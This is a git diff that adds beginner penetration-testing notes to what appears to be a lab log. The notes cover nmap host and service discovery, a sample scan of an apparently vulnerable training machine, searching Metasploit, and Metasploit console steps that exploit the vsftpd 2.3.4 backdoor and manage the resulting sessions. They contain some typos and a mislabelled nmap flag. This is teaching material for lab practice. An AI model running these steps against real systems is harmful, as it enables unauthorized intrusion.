@@ -103,3 +103,65 @@
 - _set_ : set a value to a variable
 - _show payloads_ : you will get the only payloads that are compatible with the exploit
 - _check_ : Check if the exploit will work or not
+
+---
+
+# Day 2
+
+---
+
+## Target Identification and Host discovery
+
+Now we'll be performing the first step in any penetration testing - gathering information about the target host
+
+- You might want to find out IP address if the target host in your case
+- You can use DNS enumeration for that case. DNS enumeration is the way to fins out the DNS records for a host.
+- You can use nslookup, dig, or host command to perform DNS enumeration and get the IP address associated with a domain
+- nmap -sN <ip> (Host UP/DOWN)
+- nmap -sV <ip> (Port Scanning & Service Detection)
+
+```bash
+$ nmap -sn <ip>
+$ nmap -sv <ip>
+$ nmap -v -A <ip>
+```
+
+Report of Nmap
+
+| Port    | State | Services | Version                                      |
+| ------- | ----- | -------- | -------------------------------------------- |
+| 21/tcp  | open  | ftp      | vsftpd 2.3.4                                 |
+| 22/tcp  | open  | ssh      | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) |
+| 23/tcp  | open  | telnet   | Linux telnetd                                |
+| 25/tcp  | open  | smtp     | Postfix smtpd                                |
+| 53/tcp  | open  | domain   | ISC BIND 9.4.2                               |
+| 80/tcp  | open  | http     | Apache httpd 2.2.8 ((Ubuntu) DAV/2)          |
+| 111/tcp | open  | rpcbind  | 2 (RPC #100000)                              |
+
+.... And So On
+
+---
+
+## Vulnerability Analysis
+
+- Now that we've performed the service detection step, we know what versions of applications our victim is running. We just have to find out which one of them might be vulnerable. You can find out vulnerabilities just be googling about them, or you can also search them in your Metasploit database.
+
+- #search vsftpd
+- #search OpenSSH
+- #search Postfix
+
+---
+
+## Exposing Vulnerabilities
+
+This is the most anticipated step of the penetration test. In this step, we'll exploit the victim machine in all it's glory. Let's begin with the most straightforward vulnerability to exploit that we found in the prev.. step. It is the vsftpd backdoor command execution exploit.
+
+- use 0
+- set RHOSTS <ip>
+- show payloads
+- expoit
+- whoami
+- sessions
+- sessions -l
+- sessions -u 1
+- sessions -k 1
